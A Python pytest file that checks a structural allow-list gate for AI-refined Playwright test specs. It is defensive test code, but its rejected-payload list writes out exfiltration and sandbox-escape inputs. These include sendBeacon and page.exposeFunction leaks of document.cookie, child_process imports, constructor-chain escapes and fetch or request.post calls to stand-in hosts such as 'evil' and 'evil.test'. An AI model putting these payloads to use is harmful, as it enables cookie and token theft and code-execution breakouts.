"""Tests for the structural allow-list gate (M-2 proper fix).

The gate parses the lexical structure of a refined Playwright spec and admits
ONLY the constructs a legitimate generated spec contains. These tests assert:
  * real generated specs (across every test mode) PASS,
  * hand-written legitimate constructs (file upload, dialog, arrow lambdas,
    for-loops, chained matchers, template literals) PASS,
  * the C-1/M-2 breakout payloads and evasion forms are REJECTED — including
    novel exfil/exec calls the flat deny-list does not enumerate.
"""

import pytest

from testgen.ai.ts_guard import structural_gate
from testgen.generators.playwright.adapter import PlaywrightGenerator


def _ev(t, u, target=None, payload=None, seq=1):
    return {
        "event_id": f"e{seq}", "session_id": "s1", "tab_id": "t1",
        "sequence": seq, "timestamp": "2026-03-06T14:00:00Z",
        "event_type": t, "url": u, "target": target, "payload": payload or {},
    }


LEGIT = [
    # minimal spec
    (
        "import { test, expect } from '@playwright/test';\n"
        "test('login', async ({ page }) => {\n"
        "  await page.goto('/login');\n"
        "  await expect(page).toHaveURL(/dashboard/);\n"
        "});"
    ),
    # variables import + fill with testVariables reference
    (
        "import { test, expect } from '@playwright/test';\n"
        "import { testVariables } from './variables';\n"
        "test('f', async ({ page }) => {\n"
        "  await page.getByRole('textbox', { name: 'Email' }).fill(testVariables.email);\n"
        "  await expect(page.getByRole('textbox', { name: 'Email' })).toHaveValue(testVariables.email);\n"
        "});"
    ),
    # file upload: Promise.all + array destructuring + array-literal arg
    (
        "import { test } from '@playwright/test';\n"
        "test('u', async ({ page }) => {\n"
        "  const [fileChooser] = await Promise.all([\n"
        "    page.waitForEvent('filechooser'),\n"
        "    page.getByRole('button', { name: 'Upload' }).click(),\n"
        "  ]);\n"
        "  await fileChooser.setFiles(['report.pdf']);\n"
        "});"
    ),
    # dialog handler with arrow param
    (
        "import { test } from '@playwright/test';\n"
        "test('d', async ({ page }) => {\n"
        "  page.on('dialog', async (dialog) => { await dialog.accept(); });\n"
        "  await page.getByRole('button').click();\n"
        "});"
    ),
    # waitForResponse: bare-param arrow, chained .url().includes(), template literal
    (
        "import { test } from '@playwright/test';\n"
        "test('r', async ({ page }) => {\n"
        "  const base = '/api';\n"
        "  await page.waitForResponse(resp => resp.url().includes(`${base}/status`));\n"
        "});"
    ),
    # for-loop with integer index and repeated click
    (
        "import { test } from '@playwright/test';\n"
        "test('l', async ({ page }) => {\n"
        "  for (let i = 0; i < 5; i++) { await page.getByRole('button', { name: '+' }).click(); }\n"
        "});"
    ),
    # APIResponse READ verbs are allowed even though request-INITIATING verbs are
    # not (res.ok()/res.status() are safe; res.json()/res.text() read the body).
    (
        "import { test, expect } from '@playwright/test';\n"
        "test('resp', async ({ page }) => {\n"
        "  const res = await page.waitForResponse(r => r.url().includes('/api'));\n"
        "  expect(res.ok()).toBeTruthy();\n"
        "  expect(res.status()).toBe(200);\n"
        "});"
    ),
]

# Evasion / breakout payloads. Several of these already trip the deny-list; the
# point of the gate is that the STRUCTURAL layer independently rejects them, and
# it also rejects novel forms (sendBeacon, localStorage, unknown helpers) the
# deny-list does not enumerate.
REJECTED = [
    # novel exfil primitives the flat deny-list does not list
    ("navigator.sendBeacon", "navigator.sendBeacon('/e', document.cookie)"),
    ("localStorage", "localStorage.getItem('token')"),
    ("unknown helper call", "sendExfil(document.cookie)"),
    # disallowed / dynamic imports
    ("static child_process import",
     "import cp from 'child_process';\ntest('x', async () => {});"),
    ("dynamic import", "await import('child_process')"),
    ("side-effect import", "import 'node:fs';\ntest('x', async () => {});"),
    # constructor / Function reflection
    ("computed constructor", "const o = {}; o['con' + 'structor'];"),
    ("array constructor chain", "[]['constructor']['constructor']('return process')()"),
    ("dot constructor call", "({}).constructor.constructor('return this')()"),
    # in-page JS / eval
    ("page.evaluate", "await page.evaluate(() => document.cookie)"),
    ("eval", "eval('1+1')"),
    ("Function ctor", "new Function('return process')()"),
    # --- Medium bypass (reviewer): non-allow-listed Playwright methods on a
    #     known root that the DENY-list never enumerated ---
    ("page.addInitScript", "await page.addInitScript(() => { window.x = 1; })"),
    ("page.exposeFunction", "await page.exposeFunction('leak', () => document.cookie)"),
    ("page.exposeBinding", "await page.exposeBinding('leak', () => 1)"),
    ("page.$eval", "await page.$eval('body', el => el.innerHTML)"),
    ("page.route interception", "await page.route('**/*', r => r.abort())"),
    ("page.waitForFunction", "await page.waitForFunction(() => window.done)"),
    ("unknown method frobnicate", "await page.frobnicate()"),
    # --- destructure/member rename of a sink into a benign local (the literal
    #     page.evaluate never appears, so the raw regex deny-list misses it) ---
    ("destructure-rename evaluate", "const { evaluate: go } = page; await go(() => 1)"),
    ("destructure evaluate (no rename)", "const { evaluate } = page; await evaluate(() => 1)"),
    ("member-alias evaluate", "const go = page.evaluate; await go(() => 1)"),
    ("member-alias addInitScript", "const g = page.addInitScript; await g(() => 1)"),
    # --- request-INITIATING verbs are excluded (server-side exfil vector) ---
    ("request.fetch exfil", "await request.fetch('https://evil/?c=x')"),
    ("page.request.post exfil", "await page.request.post('https://evil', {})"),
    # network primitives
    ("global fetch", "await fetch('https://evil.test')"),
    ("XMLHttpRequest", "new XMLHttpRequest()"),
    ("WebSocket", "new WebSocket('wss://evil.test')"),
    # call hidden in a template-literal interpolation
    ("template call", "await page.waitForTimeout(`${leak()}`)"),
    # computed string subscript to a global
    ("bracket global", "window['fetch']('/x')"),
]


def _wrap(body: str) -> str:
    if "import {" in body or body.strip().startswith("import "):
        return body
    return (
        "import { test } from '@playwright/test';\n"
        f"test('x', async ({{ page, request }}) => {{ {body}; }});"
    )


class TestStructuralGateAcceptsLegit:
    @pytest.mark.parametrize("spec", LEGIT)
    def test_legit_specs_pass(self, spec):
        result = structural_gate(spec)
        assert result.ok, f"legit spec rejected: {result.reason}\n{spec}"

    @pytest.mark.parametrize("mode", ["full", "nav_only", "interaction_only", "smart_grouped"])
    def test_real_generated_output_passes(self, mode):
        events = [
            _ev("navigation", "/", payload={"to_url": "/login"}, seq=1),
            _ev("fill", "/login", target={
                "selectors": {"role": {"role": "textbox", "name": "Email"}}, "tag": "INPUT",
            }, payload={"value": "user@example.com"}, seq=2),
            _ev("press_key", "/login", target={
                "selectors": {"role": {"role": "textbox", "name": "Password"}}, "tag": "INPUT",
            }, payload={"key": "Tab"}, seq=3),
            _ev("click", "/login", target={
                "selectors": {"role": {"role": "button", "name": "Sign In"}}, "tag": "BUTTON",
            }, seq=4),
            _ev("navigation", "/login", payload={"to_url": "/dashboard"}, seq=5),
        ]
        flow = {
            "canonical_pattern": "/login → /dashboard",
            "representative_events": events,
            "popularity_score": 45.0, "session_count": 45,
            "_behavior_flows": [{"canonical_pattern": "/login → /dashboard",
                                 "representative_events": events,
                                 "popularity_score": 45.0, "session_count": 45}],
        }
        cps = [{"url": "/dashboard", "visible_elements": [
            {"selectors": {"role": {"role": "heading", "name": "Welcome"}}, "text_content": "Welcome"}
        ], "page_title": "Dashboard"}]
        script = PlaywrightGenerator().generate_script(flow, cps, test_mode=mode)
        result = structural_gate(script)
        assert result.ok, f"generated ({mode}) rejected: {result.reason}\n{script}"


class TestStructuralGateRejectsBreakouts:
    @pytest.mark.parametrize("label,body", REJECTED, ids=[r[0] for r in REJECTED])
    def test_payload_rejected(self, label, body):
        result = structural_gate(_wrap(body))
        assert not result.ok, f"{label!r} should have been rejected but passed"
        assert result.reason

    def test_unterminated_string_rejected(self):
        assert not structural_gate("import { test } from '@playwright/test';\nconst x = 'oops;")

    def test_unbalanced_delimiters_rejected(self):
        spec = "import { test } from '@playwright/test';\ntest('x', async () => { ({{ });"
        assert not structural_gate(spec)

    def test_non_string_rejected(self):
        assert not structural_gate(None)
        assert not structural_gate(123)

    def test_reason_for_method_alias_names_the_alias(self):
        # The destructure-rename path must be attributed to the alias, not to a
        # generic "unknown function".
        r = structural_gate(
            "import { test } from '@playwright/test';\n"
            "test('x', async ({ page }) => { const { evaluate: go } = page; await go(() => 1); });"
        )
        assert not r.ok
        assert "alias" in r.reason.lower()

    def test_allowed_method_alias_is_fine(self):
        # Aliasing an ALLOWED method (click) into a local must still pass — the
        # alias machinery only forbids non-allow-listed method sinks.
        r = structural_gate(
            "import { test } from '@playwright/test';\n"
            "test('x', async ({ page }) => {\n"
            "  const { click } = page.getByRole('button');\n"
            "  await click();\n"
            "});"
        )
        assert r.ok, r.reason
